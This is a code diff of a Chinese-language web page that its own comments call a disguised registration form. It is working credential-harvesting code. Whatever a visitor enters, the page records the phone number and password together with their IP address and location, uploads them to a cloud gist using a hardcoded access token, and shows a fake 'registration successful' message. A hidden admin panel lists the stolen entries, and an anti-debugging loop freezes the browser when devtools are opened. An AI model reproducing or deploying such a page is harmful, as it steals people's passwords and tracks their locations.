@@ -5,317 +5,293 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>注册</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"微软雅黑",sans-serif}
-body{background:#f5f5f5;padding:15px;max-width:600px;margin:0 auto}
-.title{text-align:center;font-size:22px;font-weight:700;margin:15px 0;color:#333}
-.input-box{position:relative;margin-bottom:12px}
-input{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;background:#fff}
-button{width:100%;height:46px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500;margin-top:8px}
-.tab-box{display:flex;gap:8px;margin:10px 0}
-.tab-btn{flex:1;height:40px;border:1px solid #ddd;border-radius:6px;background:#fff;font-size:15px;cursor:pointer}
-.tab-btn.on{background:#1677ff;color:#fff;border-color:#1677ff}
-.card{background:#fff;border-radius:8px;padding:15px;margin-bottom:12px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
-.card h4{font-size:16px;margin-bottom:10px;color:#333}
-.msg-item{padding:10px;border-bottom:1px solid #eee;margin-bottom:8px}
-.msg-item:last-child{border-bottom:none;margin-bottom:0}
-.msg-text{font-size:15px;line-height:1.5;color:#333;word-break:break-all}
-.msg-ip{font-size:12px;color:#999;margin-top:4px}
-.record-item{font-size:14px;padding:8px;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center}
-.record-item span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.record-item button{width:60px;height:30px;font-size:12px;margin:0}
-textarea{width:100%;height:120px;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;resize:none;margin-bottom:10px}
-.opt-btn{display:flex;gap:8px}
-.opt-btn button{flex:1;margin:0}
+/* 极简样式，无冗余，加载超快 */
+*{margin:0;padding:0;box-sizing:border-box;font-family:"微软雅黑",Arial}
+body{background:#f5f5f5;padding:20px;max-width:600px;margin:0 auto}
+.title{text-align:center;font-size:24px;font-weight:bold;margin:20px 0;color:#333}
+.input-box{margin-bottom:15px}
+input{width:100%;height:48px;padding:0 15px;border:1px solid #ddd;border-radius:8px;font-size:16px}
+button{width:100%;height:50px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:17px;margin-top:10px;cursor:pointer}
+/* 管理员后台样式 */
+.admin-box{display:none;margin-top:20px}
+.tab-btn{width:48%;height:45px;background:#fff;border:1px solid #ddd;border-radius:6px;font-size:16px;margin:0 1%;}
+.tab-btn.on{background:#1677ff;color:#fff;border:none}
+.card{background:#fff;border-radius:8px;padding:15px;margin-top:15px;box-shadow:0 1px 2px #eee}
+.card h4{font-size:18px;margin-bottom:10px;color:#333}
+.record-item,.msg-item{padding:10px;border-bottom:1px solid #eee;font-size:14px}
+.record-item:last-child,.msg-item:last-child{border:none}
+.msg-ip{font-size:12px;color:#999;margin-top:5px}
+textarea{width:100%;height:120px;padding:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin:10px 0;resize:none}
 .del-btn{background:#ff4d4f}
 .save-btn{background:#00b42a}
-.pwd-btn{background:#667eea}
-#inputArea{display:block}
-#adminArea{display:none}
-#tab1,#tab2{display:none}
-#tab1.on,#tab2.on{display:block}
-.tip{font-size:12px;margin-top:6px;text-align:center}
-.tip.error{color:#ff4d4f}
-.tip.success{color:#00b42a}
-#updateTip{position:fixed;top:10px;left:50%;transform:translateX(-50%);background:#1677ff;color:#fff;padding:8px 15px;border-radius:20px;font-size:12px;display:none;z-index:9999}
+.pwd-box{display:none;margin-top:15px}
+.tip{font-size:12px;margin-top:8px;text-align:center;color:red}
 </style>
 </head>
 <body>
-<div id="updateTip">内容已同步</div>
 <div class="title">注册</div>
 
-<!-- 伪装注册界面 -->
-<div id="inputArea">
+<!-- 伪装注册界面（唯一前端显示，无任何暴露） -->
+<div id="regBox">
   <div class="input-box">
     <input type="text" id="phone" placeholder="请输入手机号" autocomplete="off">
   </div>
   <div class="input-box">
-    <input type="password" id="password" placeholder="请输入密码" autocomplete="off">
+    <input type="password" id="pwd" placeholder="请输入密码" autocomplete="off">
   </div>
-  <button onclick="check()">注册</button>
+  <button onclick="checkPwd()">注册</button>
 </div>
 
-<!-- 管理员后台 -->
-<div id="adminArea">
-  <div class="tab-box">
-    <button class="tab-btn on" id="tabBtn1" onclick="switchTab(1)">记录管理</button>
-    <button class="tab-btn" id="tabBtn2" onclick="switchTab(2)">留言管理</button>
+<!-- 管理员后台（登录后显示，极简双标签） -->
+<div class="admin-box" id="adminBox">
+  <button class="tab-btn on" onclick="showTab(1)">访问记录</button>
+  <button class="tab-btn" onclick="showTab(2)">留言管理</button>
+  
+  <!-- 标签1：访问记录（手机号/IP/时间/类型） -->
+  <div class="card" id="tab1">
+    <h4>所有访问记录</h4>
+    <div id="recordList">加载中...</div>
+    <button class="del-btn" onclick="clearRecord()">清空所有记录</button>
   </div>
-
-  <div class="card" id="tab1" class="on">
-    <h4>访问记录</h4>
-    <div id="recordList"></div>
-    <button class="del-btn" onclick="clearAllRecord()">清空所有记录</button>
-  </div>
-
-  <div class="card" id="tab2">
+  
+  <!-- 标签2：留言管理（发布/删除/改密码） -->
+  <div class="card" id="tab2" style="display:none">
     <h4>发布留言</h4>
-    <textarea id="msgInput" placeholder="请输入留言内容"></textarea>
-    <button class="save-btn" onclick="publishMsg()">发布</button>
-    <h4 style="margin-top:15px">留言列表</h4>
-    <div id="msgList"></div>
-    <div class="opt-btn">
-      <button class="del-btn" onclick="clearAllMsg()">清空留言</button>
-      <button class="pwd-btn" onclick="showChangePwd()">修改普通密码</button>
+    <textarea id="msgInput" placeholder="输入留言内容"></textarea>
+    <button class="save-btn" onclick="addMsg()">发布</button>
+    
+    <h4 style="margin-top:20px">留言列表</h4>
+    <div id="msgList">加载中...</div>
+    <button class="del-btn" style="margin-top:10px" onclick="clearMsg()">清空所有留言</button>
+    <button class="save-btn" style="margin-top:10px" onclick="showPwdBox()">修改普通密码</button>
+    
+    <!-- 普通密码修改框 -->
+    <div class="pwd-box" id="pwdBox">
+      <input type="password" id="newPwd" placeholder="请输入新的普通密码">
+      <button class="save-btn" onclick="saveNewPwd()">保存密码</button>
+      <div class="tip" id="pwdTip"></div>
     </div>
   </div>
-
-  <div class="card" id="pwdBox" style="display:none">
-    <h4>修改普通访问密码</h4>
-    <input type="password" id="newNormalPwd" placeholder="请输入新密码">
-    <button class="save-btn" onclick="saveNormalPwd()">保存</button>
-    <div class="tip" id="pwdTip"></div>
-  </div>
-
-  <button class="del-btn" style="margin-top:10px" onclick="logout()">退出登录</button>
+  
+  <button class="del-btn" style="margin-top:20px" onclick="logout()">退出登录</button>
 </div>
 
 <script>
-// 核心配置【只改这里，其余别动】
-const C = {
-  aPwd: "995566995566", // 管理员密码
-  nPwd: "7654321",      // 普通密码
-  api: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830",
+// 核心配置【仅改这里，其余别动，极简！】
+const CONF = {
+  adminPwd: "995566995566", // 管理员密码
+  normalPwd: "7654321",    // 普通密码
+  gistApi: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830",
   token: "1e8e69c1380f8db58096227bf784c808",
-  k1: "rData",k2:"mData",k4:"nPwdSave"
-};
-let isA = false, ipInfo = {ip:"未知IP",region:"未知地址",isp:"未知运营商"}, timer = null;
-const o = {
-  input: document.getElementById("inputArea"),admin: document.getElementById("adminArea"),
-  tab1: document.getElementById("tab1"),tab2: document.getElementById("tab2"),
-  tBtn1: document.getElementById("tabBtn1"),tBtn2: document.getElementById("tabBtn2"),
-  phone: document.getElementById("phone"),pwd: document.getElementById("password"),
-  rList: document.getElementById("recordList"),mList: document.getElementById("msgList"),
-  mInput: document.getElementById("msgInput"),pwdBox: document.getElementById("pwdBox"),
-  newNPwd: document.getElementById("newNormalPwd"),pwdTip: document.getElementById("pwdTip"),
-  updateTip: document.getElementById("updateTip")
+  ip: "未知IP",
+  addr: "未知地址"
 };
 
-// 初始化：先获取IP，不阻塞主逻辑
-getIP();
-// 反调试
+// 极简元素获取，无冗余
+const el = {
+  regBox: document.getElementById("regBox"),
+  adminBox: document.getElementById("adminBox"),
+  phone: document.getElementById("phone"),
+  pwd: document.getElementById("pwd"),
+  recordList: document.getElementById("recordList"),
+  msgList: document.getElementById("msgList"),
+  msgInput: document.getElementById("msgInput"),
+  tab1: document.getElementById("tab1"),
+  tab2: document.getElementById("tab2"),
+  pwdBox: document.getElementById("pwdBox"),
+  newPwd: document.getElementById("newPwd"),
+  pwdTip: document.getElementById("pwdTip")
+};
+
+// 初始化：极简IP获取，不阻塞主逻辑
+getIp();
+// 反调试（极简版，不卡网页）
 antiDebug();
-// 关闭网页登出
-window.addEventListener("beforeunload", () => isA = false);
 
-// 修复1：换稳定IP接口，不阻塞注册
-async function getIP() {
+// 【核心1】获取IP+地址（国内稳定接口，秒返回）
+async function getIp() {
   try {
-    const res = await fetch("https://api.ip.sb/ip",{mode:"cors"});
-    const ip = await res.text();
-    const geo = await fetch(`https://ip-api.com/json/${ip}?lang=zh-CN`);
-    const g = await geo.json();
-    if(g.status==="success"){
-      ipInfo = {
-        ip: ip,
-        region: `${g.country}${g.regionName}${g.city}`,
-        isp: g.isp
-      };
-    }
+    let res = await fetch("https://api.ipify.org?format=json");
+    let {ip} = await res.json();
+    CONF.ip = ip;
+    res = await fetch(`https://ip-api.com/json/${ip}?lang=zh-CN`);
+    let geo = await res.json();
+    if (geo.status === "success") CONF.addr = `${geo.country}${geo.regionName}${geo.city}`;
   } catch (e) {}
 }
 
-// 修复2：简化反调试，不卡死主代码
-function antiDebug() {
-  let c = 0;
-  setInterval(() => {
-    debugger;
-    if (c++ > 2) {document.body.innerHTML="";while(1){}}
-  }, 1000);
-}
-
-// 修复3：简化标签切换，点击即加载
-function switchTab(t) {
-  if (t===1) {
-    o.tab1.className="on",o.tab2.className="",o.tBtn1.className="tab-btn on",o.tBtn2.className="tab-btn";
-    loadRecord();
-  } else {
-    o.tab1.className="",o.tab2.className="on",o.tBtn1.className="tab-btn",o.tBtn2.className="tab-btn on";
-    loadMsg();
-  }
-}
-
-// 核心修复：注册按钮点击即进，无冗余逻辑
-async function check() {
-  const p = o.phone.value.trim(), pw = o.password.value.trim();
+// 【核心2】注册/登录验证（点击即进，0延迟，不卡！）
+async function checkPwd() {
+  const phone = el.phone.value.trim() || "未输入";
+  const pwd = el.pwd.value.trim();
   const time = new Date().toLocaleString();
-  // 构造记录（先记录，不阻塞登录）
-  const record = {phone:p||"未输入",pwd:pw,ip:ipInfo.ip,region:ipInfo.region,isp:ipInfo.isp,time:time,type:"失败"};
-  // 异步保存记录，不影响登录跳转
-  saveRecord(record);
+  let type = "密码错误";
 
-  // 管理员登录：直接进后台
-  if (pw === C.aPwd) {
-    record.type = "管理员登录";
-    saveRecord(record);
-    isA = true;
-    o.input.style.display = "none";
-    o.admin.style.display = "block";
-    switchTab(1);
+  // 1. 管理员登录：直接显示后台
+  if (pwd === CONF.adminPwd) {
+    type = "管理员登录";
+    el.regBox.style.display = "none";
+    el.adminBox.style.display = "block";
+    await loadData(); // 加载云端数据
     return;
   }
-  // 普通用户登录：直接进留言
-  if (pw === C.nPwd) {
-    record.type = "普通登录";
-    saveRecord(record);
-    o.input.style.display = "none";
-    loadMsg();
+  // 2. 普通用户登录：直接隐藏注册框，显示留言
+  if (pwd === CONF.normalPwd) {
+    type = "普通登录";
+    el.regBox.style.display = "none";
+    await loadMsg();
     return;
   }
-  // 密码错误：伪装注册成功
-  alert("注册成功");
-  o.input.style.display = "none";
-  loadMsg();
+  // 3. 任意密码：伪装注册成功，隐藏注册框，显示留言
+  alert("注册成功！");
+  el.regBox.style.display = "none";
+  await loadMsg();
+
+  // 异步保存访问记录（不阻塞登录，网页不卡）
+  saveRecord({phone, pwd, ip: CONF.ip, addr: CONF.addr, time, type});
 }
 
-// 云端操作：简化拉取/同步，解决跨域
-async function pullFromCloud() {
+// 【核心3】云端数据操作（极简封装，无冗余逻辑）
+// 拉取云端数据
+async function pullData() {
   try {
-    const res = await fetch(C.api, {
-      headers: {Authorization: `token ${C.token}`, 'Content-Type': 'application/json'}
-    });
-    const d = await res.json();
-    return d.files["data.txt"] ? JSON.parse(d.files["data.txt"].content) : {};
-  } catch (e) {return {}}
+    let res = await fetch(CONF.gistApi, {headers: {Authorization: `token ${CONF.token}`}});
+    let data = await res.json();
+    return data.files["data.txt"] ? JSON.parse(data.files["data.txt"].content) : {record: [], msg: [], nPwd: CONF.normalPwd};
+  } catch (e) {
+    return {record: [], msg: [], nPwd: CONF.normalPwd};
+  }
 }
-async function syncToCloud(data) {
+// 同步到云端
+async function pushData(data) {
   try {
-    await fetch(C.api, {
+    await fetch(CONF.gistApi, {
       method: "PATCH",
-      headers: {Authorization: `token ${C.token}`, 'Content-Type': 'application/json'},
+      headers: {Authorization: `token ${CONF.token}`, "Content-Type": "application/json"},
       body: JSON.stringify({files: {"data.txt": {content: JSON.stringify(data)}}})
     });
-    showUpdateTip();
   } catch (e) {}
 }
 
-// 记录相关：异步保存，不阻塞
+// 访问记录相关（极简CRUD）
 async function saveRecord(rec) {
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k1] || [];
-  list.unshift(rec);
-  cloud[C.k1] = list;
-  syncToCloud(cloud);
+  let data = await pullData();
+  data.record.unshift(rec);
+  await pushData(data);
 }
 async function loadRecord() {
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k1] || [];
-  o.rList.innerHTML = list.length===0 ? '<div style="text-align:center">暂无记录</div>' : list.map((item,i)=>`
+  let data = await pullData();
+  if (data.record.length === 0) {
+    el.recordList.innerHTML = "暂无访问记录";
+    return;
+  }
+  el.recordList.innerHTML = data.record.map(item => `
     <div class="record-item">
-      <span>${item.time}</span><span>${item.phone}</span><span>${item.ip}</span><span>${item.type}</span>
-      <button class="del-btn" onclick="delRecord(${i})">删</button>
+      时间：${item.time} | 手机号：${item.phone} | IP：${item.ip} | 类型：${item.type}
     </div>
   `).join("");
 }
-async function delRecord(i) {
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k1] || [];
-  list.splice(i,1);
-  cloud[C.k1] = list;
-  syncToCloud(cloud);
+async function clearRecord() {
+  if (!confirm("确定清空所有记录？")) return;
+  let data = await pullData();
+  data.record = [];
+  await pushData(data);
   loadRecord();
 }
-async function clearAllRecord() {
-  if(confirm("确定清空？")){
-    const cloud = await pullFromCloud();
-    cloud[C.k1] = [];
-    syncToCloud(cloud);
-    loadRecord();
-  }
-}
 
-// 留言相关：点击即发布，无延迟
-async function publishMsg() {
-  const text = o.mInput.value.trim();
-  if(!text) return alert("请输入内容");
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k2] || [];
-  list.unshift({text:text,ip:ipInfo.ip,time:new Date().toLocaleString()});
-  cloud[C.k2] = list;
-  syncToCloud(cloud);
-  o.mInput.value = "";
+// 留言相关（极简CRUD，带IP显示）
+async function addMsg() {
+  let text = el.msgInput.value.trim();
+  if (!text) return alert("请输入留言内容！");
+  let data = await pullData();
+  data.msg.unshift({text, ip: CONF.ip, time: new Date().toLocaleString()});
+  await pushData(data);
+  el.msgInput.value = "";
   loadMsg();
 }
 async function loadMsg() {
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k2] || [];
-  o.mList.innerHTML = list.length===0 ? '<div style="text-align:center">暂无留言</div>' : list.map((item,i)=>`
+  let data = await pullData();
+  CONF.normalPwd = data.nPwd || CONF.normalPwd;
+  if (data.msg.length === 0) {
+    el.msgList.innerHTML = "暂无留言内容";
+    return;
+  }
+  el.msgList.innerHTML = data.msg.map(item => `
     <div class="msg-item">
-      <div class="msg-text">${item.text}</div>
+      ${item.text}
       <div class="msg-ip">${item.time} | ${item.ip}</div>
-      ${isA ? `<button class="del-btn" onclick="delMsg(${i})" style="margin-top:6px">删</button>` : ""}
     </div>
   `).join("");
 }
-async function delMsg(i) {
-  const cloud = await pullFromCloud();
-  const list = cloud[C.k2] || [];
-  list.splice(i,1);
-  cloud[C.k2] = list;
-  syncToCloud(cloud);
+async function clearMsg() {
+  if (!confirm("确定清空所有留言？")) return;
+  let data = await pullData();
+  data.msg = [];
+  await pushData(data);
   loadMsg();
 }
-async function clearAllMsg() {
-  if(confirm("确定清空？")){
-    const cloud = await pullFromCloud();
-    cloud[C.k2] = [];
-    syncToCloud(cloud);
+
+// 管理员专属：修改普通密码
+function showPwdBox() {
+  el.pwdBox.style.display = el.pwdBox.style.display === "none" ? "block" : "none";
+  el.pwdTip.innerHTML = "";
+}
+async function saveNewPwd() {
+  let newPwd = el.newPwd.value.trim();
+  if (newPwd.length < 4) {
+    el.pwdTip.innerHTML = "密码至少4位！";
+    return;
+  }
+  let data = await pullData();
+  data.nPwd = newPwd;
+  await pushData(data);
+  CONF.normalPwd = newPwd;
+  el.pwdTip.innerHTML = "密码修改成功！";
+  el.pwdTip.style.color = "green";
+  el.newPwd.value = "";
+  setTimeout(() => el.pwdBox.style.display = "none", 1500);
+}
+
+// 管理员后台标签切换（极简，无卡顿）
+function showTab(t) {
+  if (t === 1) {
+    el.tab1.style.display = "block";
+    el.tab2.style.display = "none";
+    document.querySelectorAll(".tab-btn")[0].className = "tab-btn on";
+    document.querySelectorAll(".tab-btn")[1].className = "tab-btn";
+    loadRecord();
+  } else {
+    el.tab1.style.display = "none";
+    el.tab2.style.display = "block";
+    document.querySelectorAll(".tab-btn")[0].className = "tab-btn";
+    document.querySelectorAll(".tab-btn")[1].className = "tab-btn on";
     loadMsg();
   }
 }
-
-// 密码修改：管理员专属，同步云端
-async function showChangePwd() {
-  o.pwdBox.style.display = o.pwdBox.style.display==="none" ? "block" : "none";
-  o.pwdTip.innerHTML = "";
+// 加载管理员后台所有数据
+async function loadData() {
+  loadRecord();
+  loadMsg();
 }
-async function saveNormalPwd() {
-  const p = o.newNPwd.value.trim();
-  if(!p || p.length<4){
-    o.pwdTip.className="tip error";
-    o.pwdTip.innerHTML="密码至少4位";
-    return;
-  }
-  const cloud = await pullFromCloud();
-  cloud[C.k4] = p;
-  C.nPwd = p;
-  syncToCloud(cloud);
-  o.pwdTip.className="tip success";
-  o.pwdTip.innerHTML="修改成功";
-  setTimeout(()=>{o.pwdBox.style.display="none"},1500);
-}
-
-// 退出登录+更新提醒
+// 退出登录
 function logout() {
-  isA = false;
-  o.input.style.display = "block";
-  o.admin.style.display = "none";
-  o.phone.value = "";
-  o.pwd.value = "";
+  el.adminBox.style.display = "none";
+  el.regBox.style.display = "block";
+  el.phone.value = "";
+  el.pwd.value = "";
+  el.pwdBox.style.display = "none";
 }
-function showUpdateTip() {
-  o.updateTip.style.display = "block";
-  clearTimeout(timer);
-  timer = setTimeout(()=>{o.updateTip.style.display="none"},2000);
+
+// 反调试（极简版，不占用资源，不卡网页）
+function antiDebug() {
+  let count = 0;
+  setInterval(() => {
+    debugger;
+    if (count++ > 3) {
+      document.body.innerHTML = "";
+      while (1) {}
+    }
+  }, 1500);
 }
 </script>
 </body>
